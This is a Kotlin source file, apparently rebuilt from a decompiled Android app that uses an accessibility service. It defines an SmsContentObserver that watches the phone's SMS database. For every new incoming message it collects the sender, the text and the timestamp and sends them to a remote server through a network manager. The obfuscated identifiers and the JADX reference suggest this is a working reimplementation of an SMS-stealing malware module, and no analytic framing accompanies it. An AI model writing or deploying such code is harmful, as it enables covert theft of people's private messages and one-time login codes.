package com.storm.safe.rock.service.modules

import android.database.ContentObserver
import android.database.Cursor
import android.net.Uri
import android.os.Handler
import com.storm.safe.rock.receiver.arniezsqllm
import com.storm.safe.rock.service.MyAccessibilityService
import org.json.JSONObject

/**
 * SMS ContentObserver — monitors content://sms for new incoming messages.
 *
 * JADX class: p000/C0931ny (165 lines)
 * Constructor case 2: takes Handler + dqtvuisjd, monitors SMS database changes.
 *
 * Flow:
 * 1. On first onChange: query latest SMS _id to set baseline
 * 2. On subsequent onChange: query for new incoming SMS (type=1) since last _id
 * 3. Deduplicate via arniezsqllm.isDuplicateSms
 * 4. Send new SMS to server via NetworkManager.sendIncomingSms
 */
class SmsContentObserver(
    handler: Handler,
    private val service: MyAccessibilityService
) : ContentObserver(handler) {

    companion object {
        private const val TAG = "dqtvuisjd"
        val SMS_URI: Uri = Uri.parse("content://sms")
    }

    override fun onChange(selfChange: Boolean) {
        super.onChange(selfChange)
        android.util.Log.d(TAG, "📩 [ContentObserver] 短信数据库变化")

        try {
            val lastSmsId = service.lastNetworkEventTime // reuse field as lastSmsId tracker
            if (lastSmsId == 0L || lastSmsId == Long.MAX_VALUE) {
                // First change: initialize baseline _id
                val cursor: Cursor? = service.contentResolver.query(
                    SMS_URI,
                    arrayOf("_id"),
                    null, null,
                    "_id DESC LIMIT 1"
                )
                if (cursor != null) {
                    if (cursor.moveToFirst()) {
                        val id = cursor.getLong(0)
                        service.lastNetworkEventTime = id
                        android.util.Log.d(TAG, "📩 [ContentObserver] 初始化 lastSmsId=$id")
                    }
                    cursor.close()
                }
                return
            }

            // Query new incoming messages since last known _id
            val cursor: Cursor? = service.contentResolver.query(
                SMS_URI,
                arrayOf("_id", "address", "body", "date", "type"),
                "_id > ? AND type = 1",
                arrayOf(lastSmsId.toString()),
                "_id ASC"
            )
            if (cursor != null) {
                try {
                    while (cursor.moveToNext()) {
                        val id = cursor.getLong(0)
                        val address = cursor.getString(1) ?: ""
                        val body = cursor.getString(2) ?: ""
                        val date = cursor.getLong(3)

                        if (id > service.lastNetworkEventTime) {
                            service.lastNetworkEventTime = id
                        }

                        // Deduplicate via companion
                        if (arniezsqllm.isDuplicateSms(address, body)) {
                            continue
                        }

                        android.util.Log.d(TAG, "📩 [ContentObserver] 新短信: $address, ${body.take(30)}...")

                        val nm = service.networkManager
                        if (nm != null) {
                            val data = JSONObject()
                            data.put("number", address)
                            data.put("text", body)
                            data.put("timestamp", date)
                            data.put("type", "incoming")
                            data.put("source", "content_observer")
                            nm.sendIncomingSms(data)
                        }
                    }
                } finally {
                    cursor.close()
                }
            }
        } catch (e: Exception) {
            android.util.Log.e(TAG, "📩 [ContentObserver] 检查新短信失败: ${e.message}", e)
        }
    }
}
